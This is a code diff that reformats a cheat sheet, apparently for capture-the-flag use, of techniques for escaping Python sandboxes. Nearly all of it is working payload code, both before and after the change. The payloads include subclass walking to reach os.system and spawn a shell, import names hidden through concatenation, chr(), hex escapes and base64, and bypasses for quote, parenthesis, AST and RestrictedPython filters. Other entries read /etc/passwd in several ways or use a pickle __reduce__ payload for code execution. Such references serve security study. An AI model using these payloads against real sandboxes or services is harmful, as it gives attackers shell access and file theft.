@@ -12,21 +12,21 @@ The fundamental technique: walk Python's class hierarchy to find useful classes.
 
 ```python
 # Start from any object literal
-().__class__                          # <class 'tuple'>
-().__class__.__bases__                # (<class 'object'>,)
-().__class__.__bases__[0]             # <class 'object'>
+().__class__  # <class 'tuple'>
+().__class__.__bases__  # (<class 'object'>,)
+().__class__.__bases__[0]  # <class 'object'>
 ().__class__.__bases__[0].__subclasses__()  # ALL loaded classes
 
 # Find useful subclass (index varies by Python version):
 # Look for: os._wrap_close, warnings.catch_warnings, subprocess.Popen
 # Example: find os._wrap_close
-for i, cls in enumerate(''.__class__.__bases__[0].__subclasses__()):
-    if 'wrap_close' in str(cls):
+for i, cls in enumerate("".__class__.__bases__[0].__subclasses__()):
+    if "wrap_close" in str(cls):
         print(i, cls)
         break
 
 # Access os.system via __init__.__globals__
-().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['system']('sh')
+().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__["system"]("sh")
 ```
 
 ### Common Useful Subclasses
@@ -42,11 +42,11 @@ for i, cls in enumerate(''.__class__.__bases__[0].__subclasses__()):
 ### Alternative Starting Points
 
 ```python
-''.__class__.__mro__[1].__subclasses__()   # from string
-[].__class__.__mro__[1].__subclasses__()   # from list
-{}.__class__.__mro__[1].__subclasses__()   # from dict
+"".__class__.__mro__[1].__subclasses__()  # from string
+[].__class__.__mro__[1].__subclasses__()  # from list
+{}.__class__.__mro__[1].__subclasses__()  # from dict
 (0).__class__.__mro__[1].__subclasses__()  # from int
-True.__class__.__mro__[1].__subclasses__() # from bool
+True.__class__.__mro__[1].__subclasses__()  # from bool
 ```
 
 ---
@@ -57,14 +57,14 @@ True.__class__.__mro__[1].__subclasses__() # from bool
 
 ```python
 # String concatenation
-__builtins__.__dict__['__imp'+'ort__']('o'+'s').system('sh')
+__builtins__.__dict__["__imp" + "ort__"]("o" + "s").system("sh")
 
 # getattr
-getattr(__builtins__, '__import__')('os').system('sh')
-getattr(getattr(__builtins__, '__impo' + 'rt__')('o' + 's'), 'system')('sh')
+getattr(__builtins__, "__import__")("os").system("sh")
+getattr(getattr(__builtins__, "__impo" + "rt__")("o" + "s"), "system")("sh")
 
 # chr() construction
-eval(chr(95)*2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95)*2)
+eval(chr(95) * 2 + chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(95) * 2)
 # Builds "__import__"
 
 # Hex escape in string
@@ -75,7 +75,8 @@ eval("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f('os')")
 
 # Base64
 import base64
-eval(base64.b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NoJyk='))
+
+eval(base64.b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NoJyk="))
 ```
 
 ### When Quotes are Filtered
@@ -83,7 +84,7 @@ eval(base64.b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NoJyk='))
 ```python
 # Use chr() to build strings without quotes
 s = chr(115) + chr(104)  # "sh"
-__import__(chr(111)+chr(115)).system(s)
+__import__(chr(111) + chr(115)).system(s)
 
 # Use bytes/bytearray
 eval(bytes([111, 115]).decode())  # "os"
@@ -96,10 +97,10 @@ eval(bytes([111, 115]).decode())  # "os"
 
 ```python
 # Use getattr
-getattr(getattr(__builtins__, '__import__')('os'), 'system')('sh')
+getattr(getattr(__builtins__, "__import__")("os"), "system")("sh")
 
 # Use __getattribute__
-''.__class__.__getattribute__(''.__class__, '__bases__')
+"".__class__.__getattribute__("".__class__, "__bases__")
 ```
 
 ### When Parentheses are Filtered
@@ -111,12 +112,16 @@ getattr(getattr(__builtins__, '__import__')('os'), 'system')('sh')
 @input
 class X:
     pass
+
+
 # Prompts for input, evaluates as Python code
+
 
 # Using __init_subclass__
 class Exploit:
     def __init_subclass__(cls, **kwargs):
-        __import__('os').system('sh')
+        __import__("os").system("sh")
+
 
 class Trigger(Exploit):
     pass
@@ -144,13 +149,18 @@ Some sandboxes parse the AST and block dangerous nodes.
 # If ast.Call is blocked but ast.FunctionDef is allowed:
 class X:
     __class_getitem__ = staticmethod(exec)
+
+
 X['__import__("os").system("sh")']  # Subscript triggers exec
+
 
 # Or via __init_subclass__
 class Base:
-    def __init_subclass__(cls, cmd='', **kwargs):
-        __import__('os').system(cmd)
-class Evil(Base, cmd='sh'):
+    def __init_subclass__(cls, cmd="", **kwargs):
+        __import__("os").system(cmd)
+
+
+class Evil(Base, cmd="sh"):
     pass
 ```
 
@@ -172,8 +182,9 @@ RestrictedPython is used in Plone/Zope and some CTFs.
 ```python
 # RestrictedPython typically instruments attribute access with _getattr_
 # Bypass by accessing __globals__ through method __func__
-[x for x in ().__class__.__bases__[0].__subclasses__()
- if 'BuiltinImporter' in str(x)][0].load_module('os').system('sh')
+[x for x in ().__class__.__bases__[0].__subclasses__() if "BuiltinImporter" in str(x)][
+    0
+].load_module("os").system("sh")
 ```
 
 ---
@@ -189,23 +200,28 @@ help.__class__.__init__.__globals__  # access globals
 
 # pathlib
 from pathlib import Path
-Path('/etc/passwd').read_text()
+
+Path("/etc/passwd").read_text()
 
 # os module
 import os
-os.read(os.open('/etc/passwd', os.O_RDONLY), 1000)
+
+os.read(os.open("/etc/passwd", os.O_RDONLY), 1000)
 
 # codecs
 import codecs
-codecs.open('/etc/passwd').read()
+
+codecs.open("/etc/passwd").read()
 
 # URL handlers
 import urllib.request
-urllib.request.urlopen('file:///etc/passwd').read()
+
+urllib.request.urlopen("file:///etc/passwd").read()
 
 # linecache
 import linecache
-linecache.getlines('/etc/passwd')
+
+linecache.getlines("/etc/passwd")
 ```
 
 ---
@@ -218,9 +234,11 @@ If the sandbox uses `pickle.loads()` on untrusted data:
 import pickle
 import os
 
+
 class Exploit(object):
     def __reduce__(self):
-        return (os.system, ('sh',))
+        return (os.system, ("sh",))
+
 
 # Serialize
 payload = pickle.dumps(Exploit())
@@ -256,20 +274,20 @@ import types
 
 # Build code object that calls os.system
 code = types.CodeType(
-    0,                   # argcount
-    0,                   # posonlyargcount (Python 3.8+)
-    0,                   # kwonlyargcount
-    2,                   # nlocals
-    4,                   # stacksize
-    0,                   # flags
-    b'\x97\x00...',      # bytecode (platform-specific)
-    (None,),             # constants
-    ('__import__', 'os', 'system', 'sh'),  # names
-    (),                  # varnames
-    'exploit',           # filename
-    'exploit',           # name
-    1,                   # firstlineno
-    b'',                 # lnotab
+    0,  # argcount
+    0,  # posonlyargcount (Python 3.8+)
+    0,  # kwonlyargcount
+    2,  # nlocals
+    4,  # stacksize
+    0,  # flags
+    b"\x97\x00...",  # bytecode (platform-specific)
+    (None,),  # constants
+    ("__import__", "os", "system", "sh"),  # names
+    (),  # varnames
+    "exploit",  # filename
+    "exploit",  # name
+    1,  # firstlineno
+    b"",  # lnotab
 )
 exec(code)
 ```
